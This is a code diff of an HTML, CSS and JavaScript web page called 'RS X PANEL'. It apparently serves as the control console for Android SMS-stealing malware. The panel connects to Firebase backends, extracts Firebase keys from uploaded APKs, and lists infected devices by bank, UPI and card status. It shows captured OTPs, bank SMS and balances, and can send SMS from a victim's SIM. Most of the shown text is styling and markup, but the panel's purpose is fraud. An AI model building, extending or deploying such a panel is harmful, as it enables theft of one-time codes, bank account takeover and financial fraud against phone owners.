-        .sms-section .sms-search input { flex:1; padding:8px 12px; border:1px solid var(--border); border-radius:10px; background:var(--bg3); color:var(--text); font-size:13px; }
-        .sms-section .sms-search input:focus { border-color:var(--cyan); }
-        .sms-item { padding:12px 16px; background:var(--bg3); border:1px solid var(--border); border-radius:12px; margin-bottom:8px; animation:fadeIn 0.2s ease; }
-        @keyframes fadeIn { from { opacity:0; transform:translateY(6px); } to { opacity:1; transform:translateY(0); } }
-        .sms-item .sms-header { display:flex; justify-content:space-between; color:var(--dim); font-size:11px; margin-bottom:4px; flex-wrap:wrap; }
-        .sms-item .sms-body { color:var(--text); font-size:14px; word-break:break-word; line-height:1.5; }
-        .sms-item .sms-otp { display:inline-block; background:rgba(0,214,143,0.1); color:var(--green); font-weight:700; font-size:15px; padding:2px 12px; border-radius:6px; margin-top:6px; }
-        .sms-item .bank-tag { display:inline-block; background:rgba(246,207,69,0.12); color:var(--gold); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; }
-        .sms-item .phone-tag { display:inline-block; background:rgba(24,191,255,0.1); color:var(--cyan); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; }
-        .sms-item .tx-type { display:inline-block; font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; font-weight:600; }
-        .sms-item .tx-type.credit { background:rgba(0,214,143,0.12); color:var(--green); }
-        .sms-item .tx-type.debit { background:rgba(255,77,77,0.12); color:var(--red); }
-        .sms-item .bank-name-tag { display:inline-block; background:rgba(246,207,69,0.08); color:var(--gold); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; border:1px solid rgba(246,207,69,0.15); }
-        .sms-item .balance-tag { display:inline-block; background:rgba(0,214,143,0.06); color:var(--green); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; border:1px solid rgba(0,214,143,0.15); }
+/* INFO TAB - ROW STYLE */
+.info-list { background:var(--bg2); border:1px solid var(--border); border-radius:12px; overflow:hidden; }
+.info-row {
+    display:flex; justify-content:space-between; align-items:center;
+    padding:14px 16px; border-bottom:1px solid var(--border);
+}
+.info-row:last-child { border-bottom:none; }
+.info-row .info-label { color:var(--muted); font-size:13px; }
+.info-row .info-value { color:var(--text); font-size:13px; font-weight:600; text-align:right; }
+.info-section-title {
+    color:var(--dim); font-size:10px; font-weight:800; text-transform:uppercase;
+    letter-spacing:0.08em; margin:20px 0 10px 4px;
+}
 
-        .send-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:16px; }
-        .send-grid .full { grid-column:1/-1; }
-        .send-grid label { color:var(--dim); font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.06em; display:block; margin-bottom:4px; }
-        .send-grid input, .send-grid textarea { width:100%; padding:10px 14px; background:var(--bg3); border:1px solid var(--border); border-radius:12px; color:var(--text); font-size:13px; }
-        .send-grid input:focus, .send-grid textarea:focus { border-color:var(--cyan); }
-        .send-grid textarea { resize:vertical; min-height:80px; }
-        .send-grid .sim-toggle { display:flex; gap:10px; }
-        .send-grid .sim-toggle button { flex:1; padding:10px; border:1px solid var(--border); border-radius:12px; background:var(--bg3); color:var(--muted); font-weight:700; font-size:13px; transition:0.15s; }
-        .send-grid .sim-toggle button.active { border-color:var(--red); color:var(--red); background:rgba(255,48,39,0.06); }
-        .send-grid .sim-toggle button:hover { border-color:var(--border2); }
-        .send-btn { width:100%; padding:14px; border:0; border-radius:14px; background:linear-gradient(90deg,#ff3027,#df3a08); color:#fff; font-weight:700; font-size:15px; box-shadow:0 8px 25px rgba(255,49,30,0.18); transition:0.15s; margin-top:4px; }
-        .send-btn:hover { transform:translateY(-2px); box-shadow:0 12px 35px rgba(255,49,30,0.3); }
-        .send-btn:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
-        .send-result { margin-top:14px; padding:12px 16px; border-radius:12px; font-size:13px; font-weight:600; display:none; }
-        .send-result.ok { display:block; background:rgba(0,214,143,0.08); color:var(--green); border:1px solid rgba(0,214,143,0.15); }
-        .send-result.err { display:block; background:rgba(255,77,77,0.08); color:var(--red); border:1px solid rgba(255,77,77,0.15); }
+/* BANK TAB */
+.bank-detect-header { margin-bottom:16px; }
+.bank-detect-header .line1 { color:var(--muted); font-size:13px; }
+.bank-detect-header .line2 { color:var(--green); font-size:13px; margin-top:2px; }
 
-        @media (max-width:900px) { .grid { grid-template-columns:repeat(auto-fill, minmax(240px,1fr)); } }
-        @media (max-width:650px) {
-            .topbar { padding:0 14px; gap:10px; flex-wrap:wrap; height:auto; padding:12px 14px; }
-            .topbar .logo { font-size:14px; letter-spacing:1px; }
-            .topbar .search { max-width:100%; order:3; flex-basis:100%; }
-            .topbar .actions .status { display:none; }
-            .topbar .actions .clock { font-size:11px; min-width:50px; }
-            .grid { grid-template-columns:1fr; padding:10px 14px 20px; }
-            .statsbar { padding:12px 14px; gap:16px; flex-wrap:wrap; }
-            .filters { padding:10px 14px; flex-wrap:wrap; }
-            .modal-box { padding:20px; }
-            .brand h1 { font-size:30px; }
-            .detail-grid { grid-template-columns:1fr; }
-            .send-grid { grid-template-columns:1fr; }
-            .send-grid .full { grid-column:1; }
-            .toast { white-space:normal; max-width:90%; text-align:center; }
-            .detail-tabs .tab-btn { padding:8px 12px; font-size:12px; }
-            .bank-summary { flex-direction:column; align-items:flex-start; gap:6px; }
-        }
-    </style>
+.latest-balance-card {
+    background:linear-gradient(135deg, rgba(0,214,143,0.06), rgba(0,214,143,0.02));
+    border:1px solid rgba(0,214,143,0.12); border-radius:16px;
+    padding:20px; margin-bottom:16px;
+}
+.latest-balance-card .lbl {
+    color:var(--green); font-size:11px; font-weight:700;
+    text-transform:uppercase; letter-spacing:0.08em;
+}
+.latest-balance-card .amt {
+    font-size:30px; font-weight:900; color:var(--text); margin-top:6px;
+}
+
+.tx-card-bank {
+    background:var(--bg3); border:1px solid var(--border);
+    border-left:3px solid var(--green); border-radius:14px;
+    padding:16px; margin-bottom:12px; animation:fadeIn 0.25s ease;
+}
+.tx-card-bank .tx-top {
+    display:flex; align-items:center; gap:10px; margin-bottom:14px;
+}
+.tx-card-bank .tx-circle {
+    width:34px; height:34px; border-radius:50%; flex-shrink:0;
+    background:rgba(0,214,143,0.1); border:1px solid rgba(0,214,143,0.2);
+    display:grid; place-items:center; color:var(--green);
+    font-size:15px; font-weight:800;
+}
+.tx-card-bank .tx-bank-name { font-weight:700; font-size:14px; color:var(--green); }
+.tx-card-bank .tx-sender-code { color:var(--muted); font-size:12px; margin-left:4px; }
+.tx-card-bank .tx-badge {
+    margin-left:auto; padding:4px 12px; border-radius:999px;
+    font-size:11px; font-weight:700; background:rgba(24,191,255,0.1);
+    color:var(--cyan); border:1px solid rgba(24,191,255,0.2);
+}
+.tx-card-bank .tx-mid {
+    display:flex; justify-content:space-between; align-items:flex-end;
+    margin-bottom:2px;
+}
+.tx-card-bank .tx-mid-label {
+    color:var(--dim); font-size:9px; font-weight:700;
+    text-transform:uppercase; letter-spacing:0.06em;
+}
+.tx-card-bank .tx-mid-amt {
+    font-size:22px; font-weight:800;
+}
+.tx-card-bank .tx-mid-amt.balance { color:var(--text); }
+.tx-card-bank .tx-mid-amt.txn { color:var(--cyan); }
+.tx-card-bank .tx-divider {
+    height:1px; background:var(--border); margin:10px 0;
+}
+.tx-card-bank .tx-network {
+    display:flex; align-items:center; gap:6px;
+    color:var(--muted); font-size:13px; margin-bottom:8px;
+}
+.tx-card-bank .tx-msg {
+    color:var(--muted); font-size:12px; line-height:1.5;
+    word-break:break-word; margin-bottom:8px;
+}
+.tx-card-bank .tx-date {
+    color:var(--dim); font-size:11px;
+}
+
+.sms-section h3 { color:var(--muted); font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:12px; display:flex; gap:16px; align-items:center; }
+.sms-section h3 .count { color:var(--dim); font-weight:400; font-size:11px; }
+.sms-section .sms-search { margin-bottom:12px; display:flex; gap:8px; }
+.sms-section .sms-search input { flex:1; padding:8px 12px; border:1px solid var(--border); border-radius:10px; background:var(--bg3); color:var(--text); font-size:13px; }
+.sms-section .sms-search input:focus { border-color:var(--cyan); }
+.sms-item { padding:12px 16px; background:var(--bg3); border:1px solid var(--border); border-radius:12px; margin-bottom:8px; animation:fadeIn 0.2s ease; }
+@keyframes fadeIn { from { opacity:0; transform:translateY(6px); } to { opacity:1; transform:translateY(0); } }
+.sms-item .sms-header { display:flex; justify-content:space-between; color:var(--dim); font-size:11px; margin-bottom:4px; flex-wrap:wrap; }
+.sms-item .sms-body { color:var(--text); font-size:14px; word-break:break-word; line-height:1.5; }
+.sms-item .sms-otp-box {
+    display:inline-flex; align-items:center; gap:8px;
+    background:rgba(0,214,143,0.1); color:var(--green);
+    font-weight:700; font-size:15px; padding:4px 12px; border-radius:8px; margin-top:6px;
+}
+.sms-item .sms-otp-phone {
+    display:block; color:var(--cyan); font-size:11px; margin-top:4px; margin-left:2px;
+}
+.sms-item .bank-tag { display:inline-block; background:rgba(246,207,69,0.12); color:var(--gold); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; }
+.sms-item .phone-tag { display:inline-block; background:rgba(24,191,255,0.1); color:var(--cyan); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; }
+.sms-item .tx-type { display:inline-block; font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; font-weight:600; }
+.sms-item .tx-type.credit { background:rgba(0,214,143,0.12); color:var(--green); }
+.sms-item .tx-type.debit { background:rgba(255,77,77,0.12); color:var(--red); }
+.sms-item .bank-name-tag { display:inline-block; background:rgba(246,207,69,0.08); color:var(--gold); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; border:1px solid rgba(246,207,69,0.15); }
+.sms-item .balance-tag { display:inline-block; background:rgba(0,214,143,0.06); color:var(--green); font-size:11px; padding:2px 10px; border-radius:4px; margin-top:4px; border:1px solid rgba(0,214,143,0.15); }
+
+.send-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:16px; }
+.send-grid .full { grid-column:1/-1; }
+.send-grid label { color:var(--dim); font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.06em; display:block; margin-bottom:4px; }
+.send-grid input, .send-grid textarea { width:100%; padding:10px 14px; background:var(--bg3); border:1px solid var(--border); border-radius:12px; color:var(--text); font-size:13px; }
+.send-grid input:focus, .send-grid textarea:focus { border-color:var(--cyan); }
+.send-grid textarea { resize:vertical; min-height:80px; }
+.send-grid .sim-toggle { display:flex; gap:10px; }
+.send-grid .sim-toggle button { flex:1; padding:10px; border:1px solid var(--border); border-radius:12px; background:var(--bg3); color:var(--muted); font-weight:700; font-size:13px; transition:0.15s; }
+.send-grid .sim-toggle button.active { border-color:var(--red); color:var(--red); background:rgba(255,48,39,0.06); }
+.send-grid .sim-toggle button:hover { border-color:var(--border2); }
+.send-btn { width:100%; padding:14px; border:0; border-radius:14px; background:linear-gradient(90deg,#ff3027,#df3a08); color:#fff; font-weight:700; font-size:15px; box-shadow:0 8px 25px rgba(255,49,30,0.18); transition:0.15s; margin-top:4px; }
+.send-btn:hover { transform:translateY(-2px); box-shadow:0 12px 35px rgba(255,49,30,0.3); }
+.send-btn:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
+.send-result { margin-top:14px; padding:12px 16px; border-radius:12px; font-size:13px; font-weight:600; display:none; }
+.send-result.ok { display:block; background:rgba(0,214,143,0.08); color:var(--green); border:1px solid rgba(0,214,143,0.15); }
+.send-result.err { display:block; background:rgba(255,77,77,0.08); color:var(--red); border:1px solid rgba(255,77,77,0.15); }
+
+@media (max-width:900px) {
+    .grid { grid-template-columns:repeat(auto-fill, minmax(240px,1fr)); }
+}
+@media (max-width:650px) {
+    .topbar { padding:0 14px; gap:10px; flex-wrap:wrap; height:auto; padding:12px 14px; }
+    .topbar .logo { font-size:14px; letter-spacing:1px; }
+    .topbar .search { max-width:100%; order:3; flex-basis:100%; }
+    .topbar .actions .status { display:none; }
+    .topbar .actions .clock { font-size:11px; min-width:50px; }
+    .grid { grid-template-columns:1fr; padding:10px 14px 20px; }
+    .statsbar { padding:12px 14px; gap:16px; flex-wrap:wrap; }
+    .filters { padding:10px 14px; flex-wrap:wrap; }
+    .modal-box { padding:20px; }
+    .brand h1 { font-size:30px; }
+    .send-grid { grid-template-columns:1fr; }
+    .send-grid .full { grid-column:1; }
+    .toast { white-space:normal; max-width:90%; text-align:center; }
+    .detail-tabs .tab-btn { padding:8px 12px; font-size:12px; }
+    .zoom-controls { display:none; }
+}
+</style>
 <base target="_blank">
 <base target="_blank">
 </head>
 <body>
 
-    <div id="toast" class="toast"></div>
+<div id="toast" class="toast"></div>
 
-    <!-- HOME SCREEN -->
-    <section id="homeScreen" class="screen">
-        <div class="shell">
-            <div class="brand">
-                <div class="logo"><svg viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg></div>
-                <h1>RS <span>X</span> PANEL</h1>
-                <p>Device Management Console</p>
-            </div>
-            <div class="card">
-                <div class="card-header"><h3>◌ Saved Accounts</h3><span class="badge" id="connCount">0</span></div>
-                <div id="connectionsList"></div>
-                <button class="btn-new" id="newConnBtn">＋ New Account</button>
-                <div id="homeError" class="error-text hidden"></div>
-                <div style="margin-top:14px;text-align:center;font-size:12px;color:var(--dim)">
-                    <span>Share link: </span>
-                    <input id="shareLinkInput" style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:4px 10px;color:var(--text);font-size:12px;width:80%;margin-top:4px" readonly />
-                </div>
-            </div>
-            <div class="footer-text">RS X Admin Console · All connections are logged</div>
+<section id="homeScreen" class="screen">
+    <div class="shell">
+        <div class="brand">
+            <div class="logo"><svg viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg></div>
+            <h1>RS <span>X</span> PANEL</h1>
+            <p>Device Management Console</p>
         </div>
-    </section>
-
-    <!-- NEW ACCOUNT MODAL -->
-    <div class="modal-overlay" id="newAccountModal">
-        <div class="modal-box" style="max-width:560px">
-            <div class="modal-header"><h2>New Firebase Account</h2><button class="close" id="closeAccountModal">&times;</button></div>
-            <div class="form-group"><label>Project Label (optional)</label><input id="accLabel" placeholder="e.g. My Project" value="" /></div>
-            <div class="form-group"><label>Firebase Database URL</label><input id="accUrl" placeholder="https://project.firebaseio.com" /></div>
-            <div class="form-group"><label>Authentication Key / Secret</label><input id="accKey" type="password" placeholder="AIza..." /></div>
-            <div class="form-group">
-                <label>Extract from APK (optional)</label>
-                <div class="file-upload" id="apkUploadArea">
-                    <span>📁 Upload APK File</span>
-                    <input type="file" id="apkFileInput" accept=".apk,.txt,.json" />
-                    <div style="font-size:12px;margin-top:6px;color:var(--dim)">Auto‑extracts Firebase URL &amp; API Key</div>
-                </div>
+        <div class="card">
+            <div class="card-header"><h3>◌ Saved Accounts</h3><span class="badge" id="connCount">0</span></div>
+            <div id="connectionsList"></div>
+            <button class="btn-new" id="newConnBtn">＋ New Account</button>
+            <div id="homeError" class="error-text hidden"></div>
+            <div style="margin-top:14px;text-align:center;font-size:12px;color:var(--dim)">
+                <span>Share link: </span>
+                <input id="shareLinkInput" style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:4px 10px;color:var(--text);font-size:12px;width:80%;margin-top:4px" readonly />
             </div>
-            <div id="setupError" class="error-text hidden"></div>
-            <div class="form-actions">
-                <button class="primary" id="saveAccountBtn">⚡ Save Account</button>
-                <button class="secondary" id="cancelAccountBtn">Cancel</button>
+        </div>
+        <div class="footer-text">RS X Admin Console · All connections are logged</div>
+    </div>
+</section>
+
+<div class="modal-overlay" id="newAccountModal">
+    <div class="modal-box" style="max-width:560px">
+        <div class="modal-header"><h2>New Firebase Account</h2><button class="close" id="closeAccountModal">&times;</button></div>
+        <div class="form-group"><label>Project Label (optional)</label><input id="accLabel" placeholder="e.g. My Project" value="" /></div>
+        <div class="form-group"><label>Firebase Database URL</label><input id="accUrl" placeholder="https://project.firebaseio.com" /></div>
+        <div class="form-group"><label>Authentication Key / Secret</label><input id="accKey" type="password" placeholder="AIza..." /></div>
+        <div class="form-group">
+            <label>Extract from APK (optional)</label>
+            <div class="file-upload" id="apkUploadArea">
+                <span>📁 Upload APK File</span>
+                <input type="file" id="apkFileInput" accept=".apk,.txt,.json" />
+                <div style="font-size:12px;margin-top:6px;color:var(--dim)">Auto‑extracts Firebase URL &amp; API Key</div>
+            </div>
+        </div>
+        <div id="setupError" class="error-text hidden"></div>
+        <div class="form-actions">
+            <button class="primary" id="saveAccountBtn">⚡ Save Account</button>
+            <button class="secondary" id="cancelAccountBtn">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<section id="dashboardScreen" class="dashboard">
+    <header class="topbar">
+        <div class="logo"><div class="dot">RS</div> RS X PANEL</div>
+        <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
+        <div class="actions">
+            <div class="zoom-controls">
+                <button class="zoom-btn" id="zoomOut" title="Zoom Out">−</button>
+                <button class="zoom-btn" id="zoomReset" title="Reset">⟲</button>
+                <button class="zoom-btn" id="zoomIn" title="Zoom In">+</button>
+            </div>
+            <span class="status" id="statusLabel">● Connected</span>
+            <span class="clock" id="clockDisplay">--:--:--</span>
+            <a class="telegram" href="https://t.me/RSPANNEL" target="_blank" title="Telegram"><svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg></a>
+            <button class="logout" id="logoutBtn">Exit</button>
+        </div>
+    </header>
+    <div class="statsbar">
+        <div class="stat-item"><small>Total</small><strong id="totalStat">0</strong></div>
+        <div class="stat-item"><small>Online</small><strong class="green" id="onlineStat">0</strong></div>
+        <div class="stat-item"><small>Offline</small><strong class="red" id="offlineStat">0</strong></div>
+        <div class="stat-item"><small>Bank SMS</small><strong class="gold" id="bankStat">0</strong></div>
+    </div>
+    <div class="filters">
+        <button class="filter active" data-filter="all">All</button>
+        <button class="filter" data-filter="online">Online</button>
+        <button class="filter" data-filter="offline">Offline</button>
+        <button class="filter" data-filter="upi">Upi</button>
+        <button class="filter" data-filter="bank">Bank</button>
+        <button class="filter" data-filter="card">Card</button>
+        <button class="sort" id="sortBtn">Newest ▼</button>
+        <button class="refresh-btn" id="refreshBtn" title="Refresh">↻</button>
+    </div>
+    <div class="grid" id="deviceGrid"><div class="empty-grid">Loading devices…</div></div>
+</section>
+
+<div class="modal-overlay" id="detailModal">
+    <div class="modal-box">
+        <div class="modal-header"><h2 id="detailDeviceName">Device</h2><button class="close" id="closeDetailModal">&times;</button></div>
+        <div style="display:flex;gap:12px;margin-bottom:8px;flex-wrap:wrap;align-items:center">
+            <span id="detailStatus" style="font-weight:700">● Online</span>
+            <span>🔋 <span id="detailBattery">—</span></span>
+            <span style="color:var(--gold)">🏦 Bank SMS: <span id="detailBankCount">0</span></span>
+            <span style="color:var(--muted)">📩 SMS: <span id="detailSmsCount">0</span></span>
+            <span style="color:var(--cyan)">📱 <span id="detailPhoneDisplay">—</span></span>
+        </div>
+        <div class="detail-tabs">
+            <button class="tab-btn active" data-tab="info">Info</button>
+            <button class="tab-btn" data-tab="bank">Bank <span class="badge" id="bankTabBadge">0</span></button>
+            <button class="tab-btn" data-tab="sms">SMS <span class="badge" id="smsTabBadge">0</span></button>
+            <button class="tab-btn" data-tab="send">Send</button>
+        </div>
+        <div class="tab-content active" id="tabInfo">
+            <div id="detailInfoList"></div>
+            <div class="info-section-title">From SMS</div>
+            <div class="info-list" id="detailSims"></div>
+        </div>
+        <div class="tab-content" id="tabBank">
+            <div class="bank-detect-header" id="bankDetectHeader"></div>
+            <div id="latestBalanceCard"></div>
+            <div id="bankMessageList"></div>
+        </div>
+        <div class="tab-content" id="tabSms">
+            <div class="sms-section">
+                <h3>📩 Messages <span class="count" id="smsCountLabel">(0)</span></h3>
+                <div class="sms-search">
+                    <input id="smsSearch" placeholder="Search messages..." />
+                    <button class="btn-icon" id="refreshSmsBtn" style="padding:8px 12px">↻</button>
+                </div>
+                <div id="messageList" style="max-height:350px;overflow-y:auto"></div>
+            </div>
+        </div>
+        <div class="tab-content" id="tabSend">
+            <div class="send-grid">
+                <div class="full"><label>Select SIM</label><div class="sim-toggle"><button class="active" data-sim="1">SIM 1</button><button data-sim="2">SIM 2</button></div></div>
+                <div class="full"><label>Recipient</label><input id="smsTo" placeholder="+919876543210" /></div>
+                <div class="full"><label>Message</label><textarea id="smsBody" placeholder="Type your message here..."></textarea></div>
+                <div class="full"><button class="send-btn" id="sendSmsBtn">📤 Send via SIM 1</button><div class="send-result" id="sendResult"></div></div>
+                <div class="full" style="color:var(--dim);font-size:12px;text-align:center">Use device number: <span id="sendDevicePhone">—</span></div>
             </div>
         </div>
     </div>
+</div>
 
-    <!-- DASHBOARD -->
-    <section id="dashboardScreen" class="dashboard">
-        <header class="topbar">
-            <div class="logo"><div class="dot">RS</div> RS X PANEL</div>
-            <div class="search"><input id="searchInput" placeholder="Search devices..." /></div>
-            <div class="actions">
-                <span class="status" id="statusLabel">● Connected</span>
-                <span class="clock" id="clockDisplay">--:--:--</span>
-                <a class="telegram" href="https://t.me/RSPANNEL" target="_blank" title="Telegram"><svg viewBox="0 0 24 24"><path d="M21.5 3.5 18.3 20c-.2 1.2-.9 1.5-1.8.9l-5-3.7-2.4 2.3c-.3.3-.5.5-1 .5l.4-5.1 9.3-8.4c.4-.4-.1-.6-.6-.2L5.7 13.7.8 12.2c-1.1-.3-1.1-1.1.2-1.6L20.2 4c.9-.3 1.7.2 1.3-.5z"/></svg></a>
-                <button class="logout" id="logoutBtn">Exit</button>
-            </div>
-        </header>
-        <div class="statsbar">
-            <div class="stat-item"><small>Total</small><strong id="totalStat">0</strong></div>
-            <div class="stat-item"><small>Online</small><strong class="green" id="onlineStat">0</strong></div>
-            <div class="stat-item"><small>Offline</small><strong class="red" id="offlineStat">0</strong></div>
-            <div class="stat-item"><small>Bank SMS</small><strong class="gold" id="bankStat">0</strong></div>
-            <div class="stat-item"><small>Cards</small><strong class="cyan" id="cardStat">0</strong></div>
-        </div>
-        <div class="filters">
-            <button class="filter active" data-filter="all">All</button>
-            <button class="filter" data-filter="online">Online</button>
-            <button class="filter" data-filter="offline">Offline</button>
-            <button class="filter" data-filter="favorite">Favorite</button>
-            <button class="filter" data-filter="upi">Upi</button>
-            <button class="filter" data-filter="bank">Bank</button>
-            <button class="filter" data-filter="card">Card</button>
-            <button class="sort" id="sortBtn">Sort: Newest</button>
-        </div>
-        <div class="grid" id="deviceGrid"><div class="empty-grid">Loading devices…</div></div>
-    </section>
+<script>
 
-    <!-- DETAIL MODAL -->
-    <div class="modal-overlay" id="detailModal">
-        <div class="modal-box">
-            <div class="modal-header"><h2 id="detailDeviceName">Device</h2><button class="close" id="closeDetailModal">&times;</button></div>
-            <div style="display:flex;gap:12px;margin-bottom:8px;flex-wrap:wrap">
-                <span id="detailStatus" style="font-weight:700">● Online</span>
-                <span>🔋 <span id="detailBattery">—</span>%</span>
-                <span style="color:var(--gold)">🏦 Bank SMS: <span id="detailBankCount">0</span></span>
-                <span style="color:var(--muted)">📩 SMS: <span id="detailSmsCount">0</span></span>
-                <span style="color:var(--cyan)">📱 <span id="detailPhoneDisplay">—</span></span>
-            </div>
-            <div class="detail-tabs">
-                <button class="tab-btn active" data-tab="info">Info</button>
-                <button class="tab-btn" data-tab="bank">Bank <span class="badge" id="bankTabBadge">0</span></button>
-                <button class="tab-btn" data-tab="sms">SMS <span class="badge" id="smsTabBadge">0</span></button>
-                <button class="tab-btn" data-tab="send">Send</button>
-            </div>
-            <div class="tab-content active" id="tabInfo">
-                <div class="detail-grid" id="detailGrid"></div>
-                <div style="margin-top:12px;padding:12px;background:var(--bg3);border-radius:12px;border:1px solid var(--border)">
-                    <div style="color:var(--dim);font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:4px">From SMS</div>
-                    <div id="detailSims"></div>
-                </div>
-            </div>
-            <div class="tab-content" id="tabBank">
-                <div class="bank-summary">
-                    <span class="label">Available Balance</span>
-                    <span class="balance" id="bankBalance">—</span>
-                    <span class="bank-name" id="bankNameDisplay">—</span>
-                </div>
-                <div id="bankMessageList"></div>
-            </div>
-            <div class="tab-content" id="tabSms">
-                <div class="sms-section">
-                    <h3>📩 Messages <span class="count" id="smsCountLabel">(0)</span></h3>
-                    <div class="sms-search">
-                        <input id="smsSearch" placeholder="Search messages..." />
-                        <button class="btn-icon" id="refreshSmsBtn" style="padding:8px 12px">↻</button>
-                    </div>
-                    <div id="messageList" style="max-height:350px;overflow-y:auto"></div>
-                </div>
-            </div>
-            <div class="tab-content" id="tabSend">
-                <div class="send-grid">
-                    <div class="full"><label>Select SIM</label><div class="sim-toggle"><button class="active" data-sim="1">SIM 1</button><button data-sim="2">SIM 2</button></div></div>
-                    <div class="full"><label>Recipient</label><input id="smsTo" placeholder="+919876543210" /></div>
-                    <div class="full"><label>Message</label><textarea id="smsBody" placeholder="Type your message here..."></textarea></div>
-                    <div class="full"><button class="send-btn" id="sendSmsBtn">📤 Send via SIM 1</button><div class="send-result" id="sendResult"></div></div>
-                    <div class="full" style="color:var(--dim);font-size:12px;text-align:center">Use device number: <span id="sendDevicePhone">—</span></div>
-                </div>
-            </div>
-        </div>
-    </div>
+let CONNECTIONS = JSON.parse(localStorage.getItem('rsx_connections') || '[]');
+let activeConn = null;
+let allDevices = [];
+let filterMode = 'all';
+let searchQuery = '';
+let selectedDevice = null;
+let messageCache = {};
+let simChoice = 1;
+let pollTimer = null;
+let sortMode = 'newest';
+let detailRefreshTimer = null;
+let clockTimer = null;
+let zoomLevel = 100;
+let isLoading = false;
 
-    <script>
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        //  RS X PANEL — FINAL STABLE BUILD
-        //  Fixes: account creation, SMS sorting, 404 errors, share link
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+const $ = id => document.getElementById(id);
+const homeScreen = $('homeScreen');
+const dashboardScreen = $('dashboardScreen');
+const connectionsList = $('connectionsList');
+const connCount = $('connCount');
+const setupError = $('setupError');
+const deviceGrid = $('deviceGrid');
+const searchInput = $('searchInput');
+const statusLabel = $('statusLabel');
+const totalStat = $('totalStat');
+const onlineStat = $('onlineStat');
+const offlineStat = $('offlineStat');
+const bankStat = $('bankStat');
+const clockDisplay = $('clockDisplay');
+const shareLinkInput = $('shareLinkInput');
 
-        // ─── STATE ──────────────────────────────────────────────────────────
-        let CONNECTIONS = JSON.parse(localStorage.getItem('rsx_connections') || '[]');
-        let activeConn = null;
-        let allDevices = [];
-        let filterMode = 'all';
-        let searchQuery = '';
-        let selectedDevice = null;
-        let messageCache = {};
-        let simChoice = 1;
-        let pollTimer = null;
-        let sortMode = 'newest';
-        let detailRefreshTimer = null;
-        let clockTimer = null;
+const newAccountModal = $('newAccountModal');
+const closeAccount = $('closeAccountModal');
+const accLabel = $('accLabel');
+const accUrl = $('accUrl');
+const accKey = $('accKey');
+const apkFileInput = $('apkFileInput');
+const apkUploadArea = $('apkUploadArea');
+const saveAccountBtn = $('saveAccountBtn');
+const cancelAccountBtn = $('cancelAccountBtn');
 
-        // ─── DOM REFS ──────────────────────────────────────────────────────
-        const $ = id => document.getElementById(id);
-        const homeScreen = $('homeScreen');
-        const dashboardScreen = $('dashboardScreen');
-        const connectionsList = $('connectionsList');
-        const connCount = $('connCount');
-        const homeError = $('homeError');
-        const setupError = $('setupError');
-        const deviceGrid = $('deviceGrid');
-        const searchInput = $('searchInput');
-        const statusLabel = $('statusLabel');
-        const totalStat = $('totalStat');
-        const onlineStat = $('onlineStat');
-        const offlineStat = $('offlineStat');
-        const bankStat = $('bankStat');
-        const cardStat = $('cardStat');
-        const clockDisplay = $('clockDisplay');
-        const shareLinkInput = $('shareLinkInput');
+const detailModal = $('detailModal');
+const closeDetail = $('closeDetailModal');
+const detailInfoList = $('detailInfoList');
+const detailSims = $('detailSims');
+const messageList = $('messageList');
+const smsTo = $('smsTo');
+const smsBody = $('smsBody');
+const sendSmsBtn = $('sendSmsBtn');
+const sendResult = $('sendResult');
+const smsSearch = $('smsSearch');
+const sendDevicePhone = $('sendDevicePhone');
+const detailPhoneDisplay = $('detailPhoneDisplay');
+const bankNameDisplay = $('bankNameDisplay');
+const bankMessageList = $('bankMessageList');
+const bankDetectHeader = $('bankDetectHeader');
+const latestBalanceCard = $('latestBalanceCard');
 
-        const newAccountModal = $('newAccountModal');
-        const closeAccount = $('closeAccountModal');
-        const accLabel = $('accLabel');
-        const accUrl = $('accUrl');
-        const accKey = $('accKey');
-        const apkFileInput = $('apkFileInput');
-        const apkUploadArea = $('apkUploadArea');
-        const saveAccountBtn = $('saveAccountBtn');
-        const cancelAccountBtn = $('cancelAccountBtn');
+const tabBtns = document.querySelectorAll('.tab-btn');
+const tabContents = {
+    info: $('tabInfo'),
+    bank: $('tabBank'),
+    sms: $('tabSms'),
+    send: $('tabSend')
+};
 
-        const detailModal = $('detailModal');
-        const closeDetail = $('closeDetailModal');
-        const detailGrid = $('detailGrid');
-        const detailSims = $('detailSims');
-        const messageList = $('messageList');
-        const smsTo = $('smsTo');
-        const smsBody = $('smsBody');
-        const sendSmsBtn = $('sendSmsBtn');
